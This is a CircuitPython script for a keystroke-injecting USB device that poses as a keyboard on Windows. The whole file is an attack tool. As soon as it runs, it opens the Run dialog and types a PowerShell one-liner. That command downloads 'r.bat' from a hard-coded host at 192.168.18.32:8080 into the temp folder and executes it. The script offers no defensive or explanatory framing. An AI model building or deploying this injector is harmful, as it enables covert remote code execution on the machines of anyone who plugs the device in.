import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from keyboard_layout_win_br import KeyboardLayout

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)

def cmd():
    time.sleep(0.3)
    kbd.press(Keycode.WINDOWS, Keycode.R)
    kbd.release_all()
    time.sleep(0.3)
    layout.write("CMD")
    kbd.send(Keycode.ENTER)

def powershell():
    time.sleep(0.3)
    kbd.press(Keycode.WINDOWS, Keycode.R)
    kbd.release_all()
    time.sleep(0.3)
    layout.write("powershell")
    kbd.send(Keycode.ENTER)

def write(Text):
    layout.write(Text)

def enter():
    kbd.send(Keycode.ENTER)

def altf4():
    time.sleep(0.1)
    kbd.send(Keycode.ALT, Keycode.F4)

def win_r():
    kbd.send(Keycode.GUI, Keycode.R)


ip = "192.168.18.32:8080"
arq = "r.bat"
payload = f'powershell -c "iwr http://{ip}/{arq} -OutFile $env:TMP\\{arq}; saps $env:TMP\\{arq};"'

def run_attack():     
    time.sleep(1.5)
    win_r()
    time.sleep(0.2)
    write(payload)
    enter()

run_attack()
